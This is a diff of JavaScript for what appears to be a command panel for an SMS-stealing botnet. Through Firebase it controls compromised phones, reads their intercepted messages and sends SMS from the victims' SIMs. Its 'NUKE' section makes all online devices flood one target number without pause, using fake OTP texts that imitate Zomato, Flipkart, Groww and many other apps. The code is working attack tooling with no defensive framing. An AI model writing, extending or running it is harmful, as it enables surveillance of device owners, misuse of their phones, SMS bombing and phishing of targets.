+function filterMsgs(hasNew){var q=(document.getElementById('msgSrch').value||'').toLowerCase();var list=allMsgs.filter(function(m){if(mfMode==='incoming'&&m.type!=='incoming')return false;if(mfMode==='outgoing'&&m.type!=='outgoing')return false;if(q)return(m.message+m.sender).toLowerCase().includes(q);return true;});var el=document.getElementById('msgList');if(!list.length){el.innerHTML='<div class="empty"><div class="ei">&#128172;</div><p>No messages</p></div>';return;}el.innerHTML=list.map(function(m,i){return'<div class="msg-bub '+(m.type==='incoming'?'inc':'out')+(hasNew&&i===0?' nm':'')+'">'+'<div class="msg-meta"><span class="msg-sndr">'+esc(m.sender)+'</span><span class="msg-tp '+(m.type==='incoming'?'mt-i':'mt-o')+'">'+m.type+'</span><span class="msg-dt">'+esc(m.dateTime)+'</span></div><div class="msg-txt">'+esc(m.message)+'</div></div>';}).join('');}
+function setMF(f){mfMode=f;['all','incoming','outgoing'].forEach(function(t){var e=document.getElementById('mf-'+t);if(e)e.classList.toggle('ma',t===f);});filterMsgs(false);}
+function switchToMsgs(){if(!selDev){document.getElementById('msgNoDev').style.display='flex';document.getElementById('msgCont').style.display='none';return;}document.getElementById('msgNoDev').style.display='none';document.getElementById('msgCont').style.display='block';document.getElementById('msgDevN').textContent=selDev.name;updSimBar();if(curMsgDev!==selDev.id){document.getElementById('msgList').innerHTML='<div class="ldwrap"><div class="gold-spin"></div> Loading\u2026</div>';preloadMsgs(selDev.id);}else if(!mPoll){startMP(selDev.id);}}
+function updDD(){if(!selDev)return;var d=selDev;document.getElementById('devDisp').innerHTML='<div style="width:9px;height:9px;border-radius:50%;flex-shrink:0;background:'+(d.status?'var(--mint)':'var(--dim)')+(d.status?';box-shadow:0 0 7px var(--mint)':'')+'">&nbsp;</div><div style="flex:1"><div class="dd-name">'+esc(d.name)+'</div><div class="dd-id">'+esc(d.id)+'</div></div><span style="font-size:10px;font-weight:700;color:'+(d.status?'var(--mint)':'var(--rose)')+'">'+(d.status?'Online':'Offline')+'</span>';var s1=d.sims[0],s2=d.sims[1];document.getElementById('sn1').textContent=s1?fmtPh(s1.phoneNumber||s1.phone||''):'No SIM';document.getElementById('sn2').textContent=s2?fmtPh(s2.phoneNumber||s2.phone||''):'No SIM';document.getElementById('sb2').style.opacity=s2?'1':'0.4';}
+function cpSN(n){if(!selDev)return;var s=selDev.sims[n-1];var raw=s&&(s.phoneNumber||s.phone)||'';if(!raw){toast('No SIM '+n);return;}clip(fmtPh(raw),document.getElementById('cp'+n));toast('\u{1F4CB} Copied!');}
+function selSim(n){curSim=n;document.getElementById('sb1').className='stb'+(n===1?' s1':'');document.getElementById('sb2').className='stb'+(n===2?' s2':'');}
+async function sendSms(){if(!selDev){toast('\u26A0 Select a device');return;}var to=document.getElementById('sTo').value.trim(),msg=document.getElementById('sMsg').value.trim();if(!to||!msg){toast('\u26A0 Fill in both fields');return;}var btn=document.getElementById('sBtn');btn.disabled=true;btn.textContent='Sending\u2026';try{await fbSet('clients/'+selDev.id+'/webhookEvent/sendSms',{from:curSim,to:to,message:msg,isSended:false});showRes(true,'\u2713 SMS queued!');document.getElementById('sMsg').value='';document.getElementById('sTo').value='';}catch(e){showRes(false,'\u26A0 Failed: '+e.message);}btn.disabled=false;btn.textContent='&#128640; Send Message';}
+function showRes(ok,m){var el=document.getElementById('sRes');el.textContent=m;el.className='sres '+(ok?'ok':'err');el.style.display='block';setTimeout(function(){el.style.display='none';},4000);}
+function delOff(){var off=allDevices.filter(function(d){return !d.status;});if(!off.length){toast('No offline devices');return;}document.getElementById('confT').textContent='Delete All Offline?';document.getElementById('confM').textContent='Delete '+off.length+' offline device(s)?';document.getElementById('confOk').onclick=async function(){closeM('confirmModal');for(var i=0;i<off.length;i++){try{await fbDel('clients/'+off[i].fbKey);}catch(e){}}toast('\u2713 Deleted '+off.length);loadDevs();};openM('confirmModal');}
+function confDel(id){document.getElementById('confT').textContent='Delete Device?';document.getElementById('confM').textContent='Delete "'+id+'"?';document.getElementById('confOk').onclick=async function(){closeM('confirmModal');try{await fbDel('clients/'+id);toast('\u2713 Deleted');loadDevs();}catch(e){toast('\u26A0 Failed');}};openM('confirmModal');}
+async function addBot(){var id=document.getElementById('aId').value.trim(),n=document.getElementById('aN').value.trim(),p=document.getElementById('aP').value.trim();if(!id||!n){toast('\u26A0 ID and Name required');return;}try{await fbSet('clients/'+id,{modelName:n,mobNo:p,battery:100,status:false,sims:p?[{phoneNumber:p}]:[]});closeM('addModal');toast('\u2713 Bot added');loadDevs();['aId','aN','aP'].forEach(function(i){document.getElementById(i).value='';});}catch(e){toast('\u26A0 Failed: '+e.message);}}
+async function updNum(){var id=document.getElementById('uId').value.trim(),p=document.getElementById('uP').value.trim();if(!id||!p){toast('\u26A0 Both required');return;}try{await fbSet('clients/'+id+'/mobNo',p);closeM('updModal');toast('\u2713 Updated');loadDevs();}catch(e){toast('\u26A0 Failed');}}
+
+function switchTab(name){
+  document.querySelectorAll('.pane').forEach(function(p){p.classList.remove('active');});
+  document.querySelectorAll('.tab').forEach(function(t){t.classList.remove('active');});
+  document.getElementById('pane-'+name).classList.add('active');
+  var idx=['overview','detail','messages','sendsms','allmsgs','nuke'].indexOf(name);
+  if(idx>=0)document.querySelectorAll('.tab')[idx].classList.add('active');
+  if(name==='messages')switchToMsgs();
+  if(name==='allmsgs'){trigAM(false);startAP();}else stopAP();
+  if(name==='nuke'){nukeUpdateInfo();nukeUpdatePreview();}
+}
+
+function openM(id){document.getElementById(id).classList.add('open');}
+function closeM(id){document.getElementById(id).classList.remove('open');}
+document.querySelectorAll('.overlay').forEach(function(o){o.addEventListener('click',function(e){if(e.target===o)o.classList.remove('open');});});
+function toast(msg){var t=document.getElementById('toastEl');t.textContent=msg;t.classList.add('show');setTimeout(function(){t.classList.remove('show');},2800);}
+function esc(s){return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/'/g,'&#39;');}
+function catClick(){var c=['#00d4ff','#00d4aa','#c084fc','#80f0ff','#ff6b6b','#38bdf8'];var col=c[Math.floor(Math.random()*c.length)];var w=document.querySelector('.cat-wrap');if(w){w.style.filter='drop-shadow(0 0 40px '+col+') drop-shadow(0 0 80px '+col+')';setTimeout(function(){w.style.filter='';},700);}toast('\uD83D\uDE38 Meow!');}
+function rippleClick(e){var btn=e.currentTarget;var r=document.createElement('span');r.className='rip';var rect=btn.getBoundingClientRect();r.style.left=(e.clientX-rect.left-45)+'px';r.style.top=(e.clientY-rect.top-45)+'px';btn.appendChild(r);setTimeout(function(){r.remove();},750);}
+async function showRaw(){var id=curMsgDev||selDev&&selDev.id;var rv=document.getElementById('rawView');if(!rv)return;if(rv.style.display==='block'){rv.style.display='none';return;}rv.style.display='block';if(!id){rv.textContent='No device';return;}rv.textContent='Scanning: '+id+'\n';var paths=['messages/'+id,'sms/'+id,'clients/'+id+'/messages'];for(var i=0;i<paths.length;i++){try{var r=await fetch(FB_URL+'/'+paths[i]+'.json?auth='+FB_KEY,{signal:AbortSignal.timeout(5000)});var d=await r.json();if(d!==null){var k=typeof d==='object'?Object.keys(d):[];rv.textContent+='\n\u2713 '+paths[i]+' ('+k.length+' keys)\n'+JSON.stringify(d).substring(0,400);}else rv.textContent+='\n\u2717 '+paths[i]+' null';}catch(ex){rv.textContent+='\n\u26A0 '+paths[i]+' '+ex.message;}}rv.textContent+='\n--- done ---';}
+
+// NUKE
+function nukeRandId(){var c='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';var r='';for(var i=0;i<9;i++)r+=c[Math.floor(Math.random()*c.length)];return r;}
+function nukeSetSim(n){nukeSim=n;var b1=document.getElementById('nukeSim1Btn'),b2=document.getElementById('nukeSim2Btn');if(b1){b1.className='nuke-sim-btn '+(n===1?'nuke-sim-s1':'nuke-sim-s2');}if(b2){b2.className='nuke-sim-btn '+(n===2?'nuke-sim-s1':'nuke-sim-s2');}}
+function nukeSetDelay(v){var el=document.getElementById('nukeDelay');if(el)el.value=v;}
+var NUKE_APPS=['Blinkit','Zomato','Swiggy','BigBasket','BookMyShow','Dunzo','Zepto','Myntra','Nykaa','Meesho','Ajio','PharmEasy','1mg','Tata Neu','JioMart','Flipkart','Snapdeal','Lenskart','Urban Company','Rapido','Ola','IndiGo','MakeMyTrip','Cleartax','Groww','Zerodha','CoinDCX','Cred','Slice','Jupiter'];
+var NUKE_TEMPLATES=[
+  '{APP}: Your OTP is {OTP}. Valid for 5 mins. Do not share with anyone.',
+  'Your {APP} verification code is {OTP}. Do not share this with anyone.',
+  '{OTP} is your {APP} OTP. Use it to confirm your order. Expires in 10 mins.',
+  'Use {OTP} to log in to {APP}. Never share your OTP.',
+  '{APP} OTP: {OTP}. This code expires in 5 minutes.',
+  'Hi! {OTP} is your one-time password for {APP}. Do not share.',
+  'Your {APP} login code is {OTP}. Valid for 3 minutes.',
+  '{APP} Account: {OTP} is your verification code. Do not share.',
+  'Enter {OTP} to verify your {APP} account. Expires in 10 mins.',
+  'To complete your {APP} order, use OTP {OTP}. Do not share.',
+  '{APP} here! Use code {OTP} to sign in. Code valid for 5 mins.',
+  'Security code for {APP}: {OTP}. Never share this with anyone.',
+  '{OTP} - your {APP} OTP. Valid for 10 minutes. Keep it safe.',
+  'Welcome to {APP}! Your OTP is {OTP}. Please do not share.',
+  'Your {APP} delivery confirmation OTP is {OTP}. Show to delivery partner only.',
+];
+function nukeSetMode(m){
+  nukeMode=m;
+  var rb=document.getElementById('nukeModeRandom'),cb=document.getElementById('nukeModeCustom');
+  var rbox=document.getElementById('nukeRandomPreviewBox'),cbox=document.getElementById('nukeCustomBox');
+  if(m==='random'){
+    rb.style.background='rgba(192,132,252,.18)';rb.style.borderColor='rgba(192,132,252,.4)';rb.style.color='var(--lilac)';
+    cb.style.background='var(--bg3)';cb.style.borderColor='var(--border)';cb.style.color='var(--sub)';
+    if(rbox)rbox.style.display='block';if(cbox)cbox.style.display='none';
+    nukeUpdatePreview();
+  } else {
+    cb.style.background='rgba(0,212,255,.12)';cb.style.borderColor='rgba(0,212,255,.3)';cb.style.color='var(--gold2)';
+    rb.style.background='var(--bg3)';rb.style.borderColor='var(--border)';rb.style.color='var(--sub)';
+    if(rbox)rbox.style.display='none';if(cbox)cbox.style.display='block';
+  }
+}
+function nukeRandOTP(){return String(Math.floor(100000+Math.random()*900000));}
+function nukeBuildMsg(){
+  var app=NUKE_APPS[Math.floor(Math.random()*NUKE_APPS.length)];
+  var template=NUKE_TEMPLATES[Math.floor(Math.random()*NUKE_TEMPLATES.length)];
+  return template.replace(/\{APP\}/g,app).replace(/\{OTP\}/g,nukeRandOTP())+' '+nukeRandId();
+}
+function nukeUpdatePreview(){
+  // update random preview box
+  var rp=document.getElementById('nukePreview');
+  if(rp)rp.textContent=nukeBuildMsg();
+  // update custom preview
+  var cm=document.getElementById('nukeMsg'),cp=document.getElementById('nukeCustomPreview');
+  if(cm&&cp)cp.textContent=(cm.value.trim()||'Your message')+' '+nukeRandId();
+}
+function nukeUpdateInfo(){var on=allDevices.filter(function(d){return d.status;}).length;var el=document.getElementById('nukeOnlineCnt');if(el)el.textContent=on;nukeUpdatePreview();}
+function nukeAddLog(text,ok){var log=document.getElementById('nukeLog');if(!log)return;var div=document.createElement('div');div.className='nuke-log-entry';div.style.background=ok?'rgba(0,212,170,.08)':'rgba(255,107,107,.08)';div.style.color=ok?'var(--mint)':'var(--rose)';div.textContent=(ok?'\u2713 ':'\u2717 ')+text;log.prepend(div);while(log.children.length>60)log.removeChild(log.lastChild);}
+async function nukeFireRound(){
+  var target=document.getElementById('nukeTarget').value.trim();
+  var online=allDevices.filter(function(d){return d.status;});
+  if(!online.length){nukeAddLog('No online devices',false);return;}
+  var promises=online.map(async function(dev){
+    var msgWithId;
+    if(nukeMode==='random'){
+      msgWithId=nukeBuildMsg();
+    } else {
+      var baseMsg=(document.getElementById('nukeMsg').value||'').trim()||'Hello';
+      msgWithId=baseMsg+' '+nukeRandId();
+    }
+    try{
+      await fbSet('clients/'+dev.id+'/webhookEvent/sendSms',{from:nukeSim,to:target,message:msgWithId,isSended:false});
+      nukeSent++;
+      document.getElementById('nukeSent').textContent=nukeSent;
+      // Show the actual message that was sent
+      var lm=document.getElementById('nukeLastMsg');
+      if(lm)lm.textContent='\u2192 '+msgWithId;
+      nukeAddLog(dev.name+': '+msgWithId,true);
+    }catch(e){
+      nukeFail++;document.getElementById('nukeFail').textContent=nukeFail;
+      nukeAddLog(dev.name+' FAILED: '+e.message,false);
+    }
+  });
+  await Promise.all(promises);
+}
+async function nukeStart(){
+  var target=document.getElementById('nukeTarget').value.trim();
+  if(!target){toast('\u26A0 Enter a target number');return;}
+  if(nukeMode==='custom'){
+    var msg=(document.getElementById('nukeMsg').value||'').trim();
+    if(!msg){toast('\u26A0 Enter a message in Custom mode');return;}
+  }
+  if(!FB_URL||!FB_KEY){toast('\u26A0 Not connected to Firebase');return;}
+  var online=allDevices.filter(function(d){return d.status;});
+  if(!online.length){toast('\u26A0 No online devices \u2014 check sidebar');return;}
+  var delay=parseInt(document.getElementById('nukeDelay').value);
+  if(isNaN(delay)||delay<0)delay=0;
+  nukeRunning=true;nukeSent=0;nukeFail=0;
+  document.getElementById('nukeSent').textContent=0;
+  document.getElementById('nukeFail').textContent=0;
+  var lm=document.getElementById('nukeLastMsg');if(lm)lm.textContent='';
+  document.getElementById('nukeLog').innerHTML='';
+  document.getElementById('nukeStats').style.display='block';
+  document.getElementById('nukeFireBtn').style.display='none';
+  document.getElementById('nukeStopBtn').style.display='block';
+  document.getElementById('nukeLiveBadge').style.display='flex';
+  toast('\uD83D\uDCA3 Nuke firing! '+online.length+' devices non-stop');
+  var loop=async function(){
+    if(!nukeRunning)return;
+    try{await nukeFireRound();}catch(ex){nukeAddLog('Error: '+ex.message,false);}
+    if(nukeRunning)setTimeout(loop,0);
+  };
+  loop();
+}
+function nukeStop(){
+  nukeRunning=false;
+  if(nukeTimer){clearTimeout(nukeTimer);nukeTimer=null;}
+  document.getElementById('nukeFireBtn').style.display='block';
+  document.getElementById('nukeStopBtn').style.display='none';
+  document.getElementById('nukeLiveBadge').style.display='none';
+  toast('\u23F9 Stopped \u2014 '+nukeSent+' messages sent');
+}
+document.addEventListener('input',function(e){if(e.target&&e.target.id==='nukeMsg')nukeUpdatePreview();});
+document.addEventListener('keydown',function(e){if(e.key==='Escape')document.querySelectorAll('.overlay.open').forEach(function(o){o.classList.remove('open');});if(e.key==='Enter'&&document.getElementById('setup').style.display!=='none')connect();});
+</script>
+</body>
+</html>
